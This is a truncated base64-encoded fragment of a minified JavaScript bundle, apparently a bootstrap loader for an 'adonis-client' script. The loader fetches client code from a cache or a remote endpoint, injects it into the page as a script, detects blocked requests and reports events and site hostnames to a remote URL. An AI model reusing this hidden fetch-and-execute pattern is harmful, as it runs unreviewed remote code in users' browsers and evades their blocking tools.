0Y2ggYWRvbmlzLWNsaWVudCBvdmVyIFhIUiwgdHJ5aW5nIHRvIGxvYWQgZnJvbSBjYWNoZTogPCIrdCsiPiIpLHBbImRlZmF1bHQiXS5yZXBvcnRFcnJvcih0KSksSS5sb2FkKCl9KVsiY2F0Y2giXShmdW5jdGlvbih0KXtyZXR1cm4gdCBpbnN0YW5jZW9mIHguQ2FjaGVMb2FkRXJyb3I/eS5sb2dnZXIuaW5mbygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgZnJvbSBjYWNoZSwgdHJ5aW5nIHRvIGxvYWQgZnJvbSBTdWV6Iik6KHkubG9nZ2VyLndhcm4oIlsiK2UrIl06IFVuZXhwZWN0ZWQgZXJyb3Igd2hlbiB0cnlpbmcgZmV0Y2ggYWRvbmlzLWNsaWVudCBmcm9tIGNhY2hlLCB0cnlpbmcgdG8gbG9hZCBmcm9tIFN1ZXo6IDwiK3QrIj4iKSxwWyJkZWZhdWx0Il0ucmVwb3J0RXJyb3IodCkpLFAubG9hZCgpfSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4ucnVuPWksbi5sb2FkQWRvbmlzQ2xpZW50PWE7dmFyIGM9ZSgyMiksdT1lKDQpLHM9byh1KSxsPWUoMTgpLGQ9byhsKSxmPWUoMTYpLHA9byhmKSxoPWUoMiksZz1vKGgpLHc9ZSgxNSksdj1vKHcpLGI9ZSg2KSxfPXIoYiksbT1lKDMpLHk9ZSgxMiksRT1lKDE3KSxTPW8oRSksTz1lKDEzKSxUPW8oTyksUj1lKDExKSxDPXIoUiksQT1lKDEwKSxQPXIoQSksTD1lKDgpLEk9cihMKSx4PWUoOSl9LHsxMDoxMCwxMToxMSwxMjoxMiwxMzoxMywxNToxNSwxNjoxNiwxNzoxNywxODoxOCwyOjIsMjI6MjIsMzozLDQ6NCw2OjYsODo4LDk6OX1dLDg6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcigpe3ZhciBlPSJsb2FkZXJzL2NhY2hlL2xvYWQiO2EubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBTdGFydGluZyBjYWNoZSBsb2FkZXIiKSx3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5JiZ3aW5kb3cubG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oImFkb25pc0NhY2hlRXhwaXJ5Iik7dmFyIHQ9cGFyc2VJbnQod2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDYWNoZUV4cGlyeU1pbGxpcywxMCk7aXNOYU4odCkmJih0PTApO3ZhciBuPXdpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2xpZW50VmVyc2lvbixyPXdpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVTcmMsbz0obmV3IERhdGUpLmdldFRpbWUoKT49dCxjPXsiYWRvbmlzLWNsaWVudC12ZXJzaW9uIjpuLGV4cGlyeU1pbGxpczp0LGNhY2hlZFNvdXJjZTpyfTtyZXR1cm4gcj9vPyhhLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogQ2FjaGVkIHZlcnNpb24gb2YgYWRvbmlzLWNsaWVudCBpcyBleHBpcmVkIiksUHJvbWlzZS5yZWplY3QobmV3IGkuQ2FjaGVMb2FkRXJyb3IobnVsbCxjKSkpOihhLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogRm91bmQgYSB2YWxpZCBjYWNoZWQgdmVyc2lvbiBvZiBhZG9uaXMtY2xpZW50IiksUHJvbWlzZS5yZXNvbHZlKHtzb3VyY2U6cixtZXRhOmN9KSk6KGEubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBObyBjYWNoZWQgdmVyc2lvbiBvZiBhZG9uaXMtY2xpZW50IGZvdW5kIGluIHRoZSBsb2NhbFN0b3JhZ2UiKSxQcm9taXNlLnJlamVjdChuZXcgaS5DYWNoZUxvYWRFcnJvcihudWxsLGMpKSl9ZnVuY3Rpb24gbygpe3JldHVybiByKClbImNhdGNoIl0oZnVuY3Rpb24oZSl7aWYoZSBpbnN0YW5jZW9mIGkuQ2FjaGVMb2FkRXJyb3IpcmV0dXJue3NvdXJjZTplLnNvdXJjZSxtZXRhOmUubWV0YX19KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5sb2FkPXIsbi5sb2FkSWdub3JpbmdFcnJvcnM9bzt2YXIgaT1lKDkpLGE9ZSgxMil9LHsxMjoxMiw5Ojl9XSw5OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbyhlLHQpe2lmKCEoZSBpbnN0YW5jZW9mIHQpKXRocm93IG5ldyBUeXBlRXJyb3IoIkNhbm5vdCBjYWxsIGEgY2xhc3MgYXMgYSBmdW5jdGlvbiIpfWZ1bmN0aW9uIGkoZSx0KXtpZighZSl0aHJvdyBuZXcgUmVmZXJlbmNlRXJyb3IoInRoaXMgaGFzbid0IGJlZW4gaW5pdGlhbGlzZWQgLSBzdXBlcigpIGhhc24ndCBiZWVuIGNhbGxlZCIpO3JldHVybiF0fHwib2JqZWN0IiE9dHlwZW9mIHQmJiJmdW5jdGlvbiIhPXR5cGVvZiB0P2U6dH1mdW5jdGlvbiBhKGUsdCl7aWYoImZ1bmN0aW9uIiE9dHlwZW9mIHQmJm51bGwhPT10KXRocm93IG5ldyBUeXBlRXJyb3IoIlN1cGVyIGV4cHJlc3Npb24gbXVzdCBlaXRoZXIgYmUgbnVsbCBvciBhIGZ1bmN0aW9uLCBub3QgIit0eXBlb2YgdCk7ZS5wcm90b3R5cGU9T2JqZWN0LmNyZWF0ZSh0JiZ0LnByb3RvdHlwZSx7Y29uc3RydWN0b3I6e3ZhbHVlOmUsZW51bWVyYWJsZTohMSx3cml0YWJsZTohMCxjb25maWd1cmFibGU6ITB9fSksdCYmKE9iamVjdC5zZXRQcm90b3R5cGVPZj9PYmplY3Quc2V0UHJvdG90eXBlT2YoZSx0KTplLl9fcHJvdG9fXz10KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5DYWNoZUxvYWRFcnJvcj1uLldzQmxvY2tFcnJvcj1uLlhockJsb2NrRXJyb3I9dm9pZCAwO3ZhciBjPWUoMjEpLHU9cihjKTtuLlhockJsb2NrRXJyb3I9ZnVuY3Rpb24oZSl7ZnVuY3Rpb24gdCgpe3JldHVybiBvKHRoaXMsdCksaSh0aGlzLCh0Ll9fcHJvdG9fX3x8T2JqZWN0LmdldFByb3RvdHlwZU9mKHQpKS5hcHBseSh0aGlzLGFyZ3VtZW50cykpfXJldHVybiBhKHQsZSksdH0odVsiZGVmYXVsdCJdKSxuLldzQmxvY2tFcnJvcj1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KCl7cmV0dXJuIG8odGhpcyx0KSxpKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmFwcGx5KHRoaXMsYXJndW1lbnRzKSl9cmV0dXJuIGEodCxlKSx0fSh1WyJkZWZhdWx0Il0pLG4uQ2FjaGVMb2FkRXJyb3I9ZnVuY3Rpb24oZSl7ZnVuY3Rpb24gdChlLG4pe28odGhpcyx0KTt2YXIgcj1pKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmNhbGwodGhpcykpO3JldHVybiByLnNvdXJjZT1lLHIubWV0YT1uLHJ9cmV0dXJuIGEodCxlKSx0fSh1WyJkZWZhdWx0Il0pfSx7MjE6MjF9XSwxMDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oKXt2YXIgZT0ibG9hZGVycy9zdWV6LWh0dHAiO2QubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBTdGFydGluZyBTdWV6IEhUVFAgbG9hZGVyIik7dmFyIHQ9SlNPTi5zdHJpbmdpZnkoe2hvc3Q6ImFzc2V0cyIscGF0aDoiY2xpZW50IixwYXJhbXM6e30saGVhZGVyczp7YWRvbmlzX2NsaWVudF9hcGk6IjcuMC4wIn19KSxuPXsiQWRvbmlzLVZlcnNpb24iOiI3LjAuMCIsIkNhY2hlLUFkb25pcyI6InRydWUifTtyZXR1cm4gdm9pZCAwPT09Y1siZGVmYXVsdCJdLlNVRVpfSFRUUF9FTkRQT0lOVD9Qcm9taXNlLnJlamVjdChuZXcgRXJyb3IoIk5vIGFkb25pcyB0cmFuc3BvcnQgZm91bmQiKSk6KDAsbC5yZXF1ZXN0KShjWyJkZWZhdWx0Il0uU1VFWl9IVFRQX0VORFBPSU5ULCJQT1NUIix0LG4pLnRoZW4oZnVuY3Rpb24odCl7ZC5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN1Y2Nlc3NmdWxseSBmZXRjaGVkIGFkb25pcy1jbGllbnQgb3ZlciBYSFIiKTt2YXIgbj17fTt0cnl7blsiYWRvbmlzLWNsaWVudC12ZXJzaW9uIl09dC5nZXRSZXNwb25zZUhlYWRlcigiYWRvbmlzLWNsaWVudC12ZXJzaW9uIil9Y2F0Y2gocil7fXRyeXtuWyJjYWNoZS1jb250cm9sIl09dC5nZXRSZXNwb25zZUhlYWRlcigiY2FjaGUtY29udHJvbCIpfWNhdGNoKHIpe31yZXR1cm57c291cmNlOnQucmVzcG9uc2VUZXh0LG1ldGE6bn19KVsiY2F0Y2giXShmdW5jdGlvbih0KXt0aHJvdyBkLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgZnJvbSBTdWV6IG92ZXIgWEhSIDwiK3QrIj4iKSwwPT09dC5yZXEuc3RhdHVzP25ldyBmLlhockJsb2NrRXJyb3I6bmV3IEVycm9yKCJVbmV4cGVjdGVkIGVycm9yIGZldGNoaW4gYWRvbmlzLWNsaWVudCwgc3RhdHVzLWNvZGUgPSA8Iit0LnJlcS5zdGF0dXMrIj4iKX0pfWZ1bmN0aW9uIGkoKXt2YXIgZT1jWyJkZWZhdWx0Il0uU1VFWl9IVFRQX1JFVFJZfHwxLHQ9Y1siZGVmYXVsdCJdLlNVRVpfSFRUUF9ERUxBWXx8MCxuPUFycmF5LmFwcGx5KDAsQXJyYXkoZSkpLm1hcChmdW5jdGlvbihlKXtyZXR1cm4gb30pO3JldHVybiBzWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLnN1ZXpfb3BlbmluZyIpLCgwLHAuY2hhaW4pKG4sdCkudGhlbihmdW5jdGlvbihlKXtyZXR1cm4gc1siZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC5zdWV6X29wZW5lZCIpLGV9KVsiY2F0Y2giXShmdW5jdGlvbihlKXt0aHJvdyBlIGluc3RhbmNlb2YgZi5YaHJCbG9ja0Vycm9yJiZzWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLnN1ZXpfYmxvY2tlZCIpLGV9KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5sb2FkT25jZT1vLG4ubG9hZD1pO3ZhciBhPWUoNCksYz1yKGEpLHU9ZSgxNikscz1yKHUpLGw9ZSgxOSksZD1lKDEyKSxmPWUoOSkscD1lKDE0KX0sezEyOjEyLDE0OjE0LDE2OjE2LDE5OjE5LDQ6NCw5Ojl9XSwxMTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oKXt2YXIgZT0ibG9hZGVycy9jYWNoZS94aHIiO3JldHVybiBkLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogU3RhcnRpbmcgWEhSIGxvYWRlciIpLCgwLGwucmVxdWVzdCkoY1siZGVmYXVsdCJdLkFET05JU19DTElFTlRfRkVUQ0hfVVJMKS50aGVuKGZ1bmN0aW9uKHQpe2QubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBTdWNjZXNzZnVsbHkgZmV0Y2hlZCBhZG9uaXMtY2xpZW50IG92ZXIgWEhSIik7dmFyIG49eyJhZG9uaXMtY2xpZW50LXZlcnNpb24iOm51bGx9O3RyeXtuWyJjYWNoZS1jb250cm9sIl09dC5nZXRSZXNwb25zZUhlYWRlcigiY2FjaGUtY29udHJvbCIpfWNhdGNoKHIpe31yZXR1cm57c291cmNlOnQucmVzcG9uc2VUZXh0LG1ldGE6bn19KVsiY2F0Y2giXShmdW5jdGlvbih0KXt0aHJvdyBkLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgb3ZlciBYSFIgPCIrdCsiPiIpLDA9PT10LnJlcS5zdGF0dXM/bmV3IGYuWGhyQmxvY2tFcnJvcjpuZXcgRXJyb3IoIlVuZXhwZWN0ZWQgZXJyb3IgcGVyZm9ybWluZyBzdGF0dXMgY2hlY2sgcmVxdWVzdCwgc3RhdHVzLWNvZGUgPSA8Iit0LnJlcS5zdGF0dXMrIj4iKX0pfWZ1bmN0aW9uIGkoKXtyZXR1cm4gbygpWyJjYXRjaCJdKGZ1bmN0aW9uKGUpe3JldHVybiBkLmxvZ2dlci5kZWJ1ZygiZmFpbGVkIHRvIGxvYWQgYWRvbmlzLWNsaWVudCBvdmVyIGh0dHAiLGUpLHNbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmNsaWVudF9odHRwX2ZldGNoX2Vycm9yIikse3NvdXJjZTpudWxsLG1ldGE6e319fSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4ubG9hZD1vLG4ubG9hZElnbm9yaW5nRXJyb3JzPWk7dmFyIGE9ZSg0KSxjPXIoYSksdT1lKDE2KSxzPXIodSksbD1lKDE5KSxkPWUoMTIpLGY9ZSg5KX0sezEyOjEyLDE2OjE2LDE5OjE5LDQ6NCw5Ojl9XSwxMjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fXZhciBvPWUoNCksaT1yKG8pLGE9ZSgyOCksYz0oMCxhLmNyZWF0ZSkoe2xldmVsOmlbImRlZmF1bHQiXS5MT0dfTEVWRUx9KTt0LmV4cG9ydHM9e2xvZ2dlcjpjLHN1ZXpMb2dnZXI6Y319LHsyODoyOCw0OjR9XSwxMzpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3ZhciB0PWFyZ3VtZW50cy5sZW5ndGg+MSYmdm9pZCAwIT09YXJndW1lbnRzWzFdP2FyZ3VtZW50c1sxXToiTkVXX1NDUklQVF9FVkVOVCIsbj1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06e30scj1uZXcgbyh0LHtkZXRhaWw6bn0pO2UuZGlzcGF0Y2hFdmVudChyKX12YXIgbz1lKDIwKTt0LmV4cG9ydHM9cn0sezIwOjIwfV0sMTQ6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlLHQsbil7aWYoQXJyYXkuaXNBcnJheShlKSYmMD09PWUubGVuZ3RoKXJldHVybiBQcm9taXNlLnJlamVjdChuKTt0PXR8fDA7dmFyIGk9ZVswXTtyZXR1cm4gZT1lLnNsaWNlKDEpLGkoKVsiY2F0Y2giXShmdW5jdGlvbihuKXtyZXR1cm4gbyh0KS50aGVuKGZ1bmN0aW9uKG8pe3JldHVybiByKGUsdCxuKX0pfSl9ZnVuY3Rpb24gbyhlKXtyZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24odCxuKXtzZXRUaW1lb3V0KGZ1bmN0aW9uKGUpe3JldHVybiB0KCl9LGUpfSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uY2hhaW49cn0se31dLDE1OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0KXthLmRlYnVnKCJpbnNlcmluZyBibG9iIik7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7bi5zcmM9ZSx0JiYobi5pbnRlZ3JpdHk9dCksZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChuKX1mdW5jdGlvbiBvKGUsdCl7dmFyIG49bmV3IHdpbmRvdy5YTUxIdHRwUmVxdWVzdDt0cnl7bi5vcGVuKCJHRVQiLGUsITApLG4uYWRkRXZlbnRMaXN0ZW5lcigicmVhZHlzdGF0ZWNoYW5nZSIsZnVuY3Rpb24oZSl7ND09PW4ucmVhZHlTdGF0ZSYmMD09PW4uc3RhdHVzJiZpKHQpfSksbi5zZW5kKCl9Y2F0Y2gocil7YS53YXJuKCJGYWxsaW5nIGJhY2sgdG8gaW5zZXJ0aW5nIGlubGluZSBzY3JpcHQiKSxpKHQpfX1mdW5jdGlvbiBpKGUpe3ZhciB0PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3QuaW5uZXJIVE1MPWUsZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh0KX12YXIgYT1lKDEyKS5sb2dnZXI7dC5leHBvcnRzPXtpbnNlcnRCbG9iU2NyaXB0OnIsdGVzdEJsb2JBbmRJbnNlcnRGYWxsYmFjazpvLGluc2VydElubGluZVNjcmlwdDppfX0sezEyOjEyfV0sMTY6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXt2YXIgdD1uZXcgWE1MSHR0cFJlcXVlc3Qsbj1bcy5SRVBPUlRJTkdfVVJMLGVdLmpvaW4oIiIpO3Qub3BlbigiR0VUIixuLCEwKSx0LnNlbmQoKX1mdW5jdGlvbiBvKGUpe3MuUkVQT1JUX0VSUk9SUyYmcigiL2Fkb25pc19lcnJvcj9lPSIrZS50b1N0cmluZygpKyImd2Vic2l0ZT0iK3dpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZSl9ZnVuY3Rpb24gaSgpe3JldHVybiBudWxsIT13aW5kb3cuQURPTklTX0JPT1RTVFJBUF9TVEFUUz93aW5kb3cuQURPTklTX0JPT1RTVFJBUF9TVEFUUz09PSEwOk1hdGgucmFuZG9tKCk8cy5SRVBPUlRJTkdfUkFURX1mdW5jdGlvbiBhKGUsdCl7aWYoYyhlKSxpKCkpe3ZhciBuPXt3ZWJzaXRlOndpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZSxrZXk6ZX07bnVsbCE9dCYmKG4ucXVhbnRpdHk9dCkscihbIi9hZG9uaXNfZXZlbnQvP2V2ZW50PSIsSlNPTi5zdHJpbmdpZnkobildLmpvaW4oIiIpKX19ZnVuY3Rpb24gYyhlKXt2YXIgdD17a2V5OmUsdGltZV9tczpNYXRoLnJvdW5kKHdpbmRvdy5wZXJmb3JtYW5jZS5ub3coKSksd2Vic2l0ZTp3aW5kb3cubG9jYXRpb24uaG9zdG5hbWV9O2QucHVzaCh0KX1mdW5jdGlvbiB1KCl7bC5kZWZpbmVSZWFkT25seVByb3BlcnR5KCJhZG9uaXNCb290c3RyYXBUaW1pbmciLGQpfXZhciBzPWUoNCksbD1lKDE4KSxkPVtdO3QuZXhwb3J0cz17cmVwb3J0RXJyb3I6byxyZXBvcnRFdmVudDphLHNhdmVUaW1pbmc6dSxzaG91bGRSZXBvcnQ6aX19LHsxODoxOCw0OjR9XSwxNzpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3ZhciB0PS9hbmRyb2lkfGlwaG9uZS9naSxuPS9DaHJvbWVcLyhcUykrIFNhZmFyaVwvKFxTKSskL2dpLHI9L1wpIEdlY2tvXC8oXFMpKyBGaXJlZm94XC8oXFMpKyQvZ2ksbz0vbGlrZSBHZWNrby4/XCkgVmVyc2lvblwvKFxTKSsgU2FmYXJpXC8oXFMpKyQvZ2k7cmV0dXJuIGUuc2VhcmNoKHQpPT09LTEmJihlLnNlYXJjaChuKT4tMXx8ZS5zZWFyY2gocik+LTF8fGUuc2VhcmNoKG8pPi0xKX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksblsiZGVmYXVsdCJdPXJ9LHt9XSwxODpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7dHJ5e09iamVjdC5kZWZpbmVQcm9wZXJ0eSh3aW5kb3csZSx7dmFsdWU6dCx3cml0YWJsZTohMX0pfWNhdGNoKG4pe28ud2FybigiQ2Fubm90IGRlZmluZSByZWFkLW9ubHkgcHJvcGVydHkgb2Ygd2luZG93IG9iamVjdDogIituKX19dmFyIG89ZSgxMikubG9nZ2VyLGk9ZnVuY3Rpb24oZSl7ImxvYWRpbmciIT09ZG9jdW1lbnQucmVhZHlTdGF0ZT9lKCk6ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsZSl9O3QuZXhwb3J0cz17ZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eTpyLHJlYWR5Oml9fSx7MTI6MTJ9XSwxOTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oZSx0KXtpZighKGUgaW5zdGFuY2VvZiB0KSl0aHJvdyBuZXcgVHlwZUVycm9yKCJDYW5ub3QgY2FsbCBhIGNsYXNzIGFzIGEgZnVuY3Rpb24iKX1mdW5jdGlvbiBpKGUsdCl7aWYoIWUpdGhyb3cgbmV3IFJlZmVyZW5jZUVycm9yKCJ0aGlzIGhhc24ndCBiZWVuIGluaXRpYWxpc2VkIC0gc3VwZXIoKSBoYXNuJ3QgYmVlbiBjYWxsZWQiKTtyZXR1cm4hdHx8Im9iamVjdCIhPXR5cGVvZiB0JiYiZnVuY3Rpb24iIT10eXBlb2YgdD9lOnR9ZnVuY3Rpb24gYShlLHQpe2lmKCJmdW5jdGlvbiIhPXR5cGVvZiB0JiZudWxsIT09dCl0aHJvdyBuZXcgVHlwZUVycm9yKCJTdXBlciBleHByZXNzaW9uIG11c3QgZWl0aGVyIGJlIG51bGwgb3IgYSBmdW5jdGlvbiwgbm90ICIrdHlwZW9mIHQpO2UucHJvdG90eXBlPU9iamVjdC5jcmVhdGUodCYmdC5wcm90b3R5cGUse2NvbnN0cnVjdG9yOnt2YWx1ZTplLGVudW1lcmFibGU6ITEsd3JpdGFibGU6ITAsY29uZmlndXJhYmxlOiEwfX0pLHQmJihPYmplY3Quc2V0UHJvdG90eXBlT2Y/T2JqZWN0LnNldFByb3RvdHlwZU9mKGUsdCk6ZS5fX3Byb3RvX189dCl9ZnVuY3Rpb24gYyhlKXt2YXIgdD1hcmd1bWVudHMubGVuZ3RoPjEmJnZvaWQgMCE9PWFyZ3VtZW50c1sxXT9hcmd1bWVudHNbMV06IkdFVCIsbj1hcmd1bWVudHMubGVuZ3RoPjImJnZvaWQgMCE9PWFyZ3VtZW50c1syXT9hcmd1bWVudHNbMl06bnVsbCxyPWFyZ3VtZW50cy5sZW5ndGg+MyYmdm9pZCAwIT09YXJndW1lbnRzWzNdP2FyZ3VtZW50c1szXTp7fTtyZXR1cm4gbmV3IHdpbmRvdy5Qcm9taXNlKGZ1bmN0aW9uKG8saSl7dmFyIGE9bmV3IHdpbmRvdy5YTUxIdHRwUmVxdWVzdDthLm9wZW4odCxlLCEwKTtmb3IodmFyIGMgaW4gcil7dmFyIHU9cltjXTthLnNldFJlcXVlc3RIZWFkZXIoYyx1KX1hLm9ubG9hZD1mdW5jdGlvbigpe2Euc3RhdHVzPj00MDA/aShuZXcgbChhLCJVbmV4cGVjdGVkIHN0YXR1cyBjb2RlIikpOm8oYSl9LGEub25lcnJvcj1mdW5jdGlvbigpe2kobmV3IGwoYSwiRXJyb3IgZXN0YWJsaXNoaW5nIGNvbm5lY3Rpb24iKSl9LGEuc2VuZChuKX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLlhoclJlcXVlc3RFcnJvcj12b2lkIDAsbi5yZXF1ZXN0PWM7dmFyIHU9ZSgyMSkscz1yKHUpLGw9bi5YaHJSZXF1ZXN0RXJyb3I9ZnVuY3Rpb24oZSl7ZnVuY3Rpb24gdChlLG4pe28odGhpcyx0KTt2YXIgcj1pKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmNhbGwodGhpcyxuKSk7cmV0dXJuIHIucmVxPWUscn1yZXR1cm4gYSh0LGUpLHR9KHNbImRlZmF1bHQiXSl9LHsyMToyMX1dLDIwOltmdW5jdGlvbihlLHQsbil7KGZ1bmN0aW9uKGUpe2Z1bmN0aW9uIG4oKXt0cnl7dmFyIGU9bmV3IHIoImNhdCIse2RldGFpbDp7Zm9vOiJiYXIifX0pO3JldHVybiJjYXQiPT09ZS50eXBlJiYiYmFyIj09PWUuZGV0YWlsLmZvb31jYXRjaCh0KXt9cmV0dXJuITF9dmFyIHI9ZS5DdXN0b21FdmVudDt0LmV4cG9ydHM9bigpP3I6InVuZGVmaW5lZCIhPXR5cGVvZiBkb2N1bWVudCYmImZ1bmN0aW9uIj09dHlwZW9mIGRvY3VtZW50LmNyZWF0ZUV2ZW50P2Z1bmN0aW9uKGUsdCl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRXZlbnQoIkN1c3RvbUV2ZW50Iik7cmV0dXJuIHQ/bi5pbml0Q3VzdG9tRXZlbnQoZSx0LmJ1YmJsZXMsdC5jYW5jZWxhYmxlLHQuZGV0YWlsKTpuLmluaXRDdXN0b21FdmVudChlLCExLCExLHZvaWQgMCksbn06ZnVuY3Rpb24oZSx0KXt2YXIgbj1kb2N1bWVudC5jcmVhdGVFdmVudE9iamVjdCgpO3JldHVybiBuLnR5cGU9ZSx0PyhuLmJ1YmJsZXM9Qm9vbGVhbih0LmJ1YmJsZXMpLG4uY2FuY2VsYWJsZT1Cb29sZWFuKHQuY2FuY2VsYWJsZSksbi5kZXRhaWw9dC5kZXRhaWwpOihuLmJ1YmJsZXM9ITEsbi5jYW5jZWxhYmxlPSExLG4uZGV0YWlsPXZvaWQgMCksbn19KS5jYWxsKHRoaXMsInVuZGVmaW5lZCIhPXR5cGVvZiBnbG9iYWw/Z2xvYmFsOiJ1bmRlZmluZWQiIT10eXBlb2Ygc2VsZj9zZWxmOiJ1bmRlZmluZWQiIT10eXBlb2Ygd2luZG93P3dpbmRvdzp7fSl9LHt9XSwyMTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gbyhlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGkoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfWZ1bmN0aW9uIGEoZSl7ZnVuY3Rpb24gdCgpe2UuYXBwbHkodGhpcyxhcmd1bWVudHMpfXJldHVybiB0LnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKGUucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ